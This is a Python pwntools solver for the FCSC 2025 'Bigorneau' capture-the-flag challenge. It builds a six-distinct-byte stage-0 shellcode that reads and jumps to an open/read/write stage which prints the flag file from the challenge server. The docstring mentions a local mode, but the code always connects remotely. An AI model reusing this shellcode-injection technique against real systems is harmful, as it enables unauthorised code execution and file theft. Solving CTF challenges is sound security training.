#!/usr/bin/env python3
"""
All-in-one solver for the FCSC 2025 Bigorneau challenge.

- Mode local : lance `python3 bigorneau.py` (wrapper challenge) et injecte le shellcode.
- Mode remote : se connecte à l’hôte/port (exposé par docker ou l’instance distante).

Stage 0 (8 octets, 6 valeurs distinctes) lit 0x54 octets depuis stdin (hex) vers la
pile et pivote vers ce buffer. Stage 1 est un shellcode open/read/write qui lit le
flag et l’affiche.
Ce solveur pwn permet de générer l'exploit local ou distant produisant le flag (option v)
Auteur(e) : JG
"""

import argparse
import time
import subprocess

from pwn import asm, context, process, remote, shellcraft
import re


context.arch = "amd64"


def build_stage0(length_byte: int = 0x54) -> bytes:
    """Construit le stage0 (8 octets, 6 valeurs distinctes) qui lit stage1 puis saute dessus."""
    """
    54                push rsp
    5e                pop rsi                ; rsi = rsp (writable buffer)
    b2 <len>          mov dl, <len>          ; read length
    0f 05             syscall                ; read(0, rsi, len)
    54                push rsp
    c3                ret                    ; jump to Stage 1
    """
    stage0 = bytes([0x54, 0x5E, 0xB2, length_byte, 0x0F, 0x05, 0x54, 0xC3])
    assert len(set(stage0)) <= 6
    assert len(stage0) <= 128
    return stage0


def build_stage1(flag_path: str = "/flag", read_len: int = 0x100, stage0_len: int = 0x54) -> bytes:
    """Construit le stage1 open/read/write sur flag_path, paddé à stage0_len octets."""
    raw = asm(
        shellcraft.open(flag_path, 0)
        + shellcraft.read("rax", "rsp", read_len)
        + "mov rdx, rax;"                # n’afficher que le nombre d’octets réellement lus
        + shellcraft.write(1, "rsp", "rdx")
    )
    assert len(raw) <= stage0_len, f"Stage 1 ({len(raw)} bytes) longer than Stage 0 read ({stage0_len})."
    return raw.ljust(stage0_len, b"\x90")


def exploit(io, stage0: bytes, stage1: bytes, wait: float = 0.5, verbose: bool = False) -> bytes:
    """Envoie stage0 en hex, puis stage1 en binaire, récupère la sortie."""
    if verbose:
        print(f"[+] Stage0 len={len(stage0)} distinct={len(set(stage0))} hex={stage0.hex()}")
        print(f"[+] Stage1 len={len(stage1)}")

    io.recvuntil(b"bytes):")
    io.recvline()  # consomme le \n
    io.sendline(stage0.hex().encode())

    # Laisser input() côté challenge se terminer avant d'envoyer le binaire.
    time.sleep(wait)
    io.send(stage1)
    io.shutdown("send")
    return io.recv(timeout=5) or b""


def extract_flag(output: bytes) -> str | None:
    """Retourne la première occurrence FCSC{...} dans la sortie, sinon None."""
    m = re.search(rb"FCSC\{[^}]+\}", output)
    return m.group(0).decode() if m else None


def main() -> None:
    """Parse les options, construit les stages, contacte le service et affiche le flag/sortie."""
    parser = argparse.ArgumentParser(description="Solver for FCSC 2025 — Bigorneau.")
    parser.add_argument("--host", default="chall.fcsc.fr", help="remote host")
    parser.add_argument("--port", type=int, default=2102, help="remote port")
    parser.add_argument("--local", action="store_true", help="run against local python3 bigorneau.py")
    parser.add_argument("--flag-path", default="/flag", help="path of the flag file (for local testing)")
    parser.add_argument("-v", "--verbose", action="store_true", help="print debug info")
    parser.add_argument("-w", "--wait", type=float, default=0.2, help="delay before sending stage1 (seconds)")
    args = parser.parse_args()

    stage0 = build_stage0()
    stage1 = build_stage1(args.flag_path, stage0_len=stage0[3])

    # Par simplicité, on passe toujours par un socket (local = service docker : host/port).
    io = remote(args.host, args.port)
    try:
        data = exploit(io, stage0, stage1, wait=args.wait, verbose=args.verbose)
        flag = extract_flag(data)
        print("Result:")
        if flag:
            print(flag)
        else:
            print(data.decode(errors="ignore"))
    finally:
        io.close()


if __name__ == "__main__":
    main()
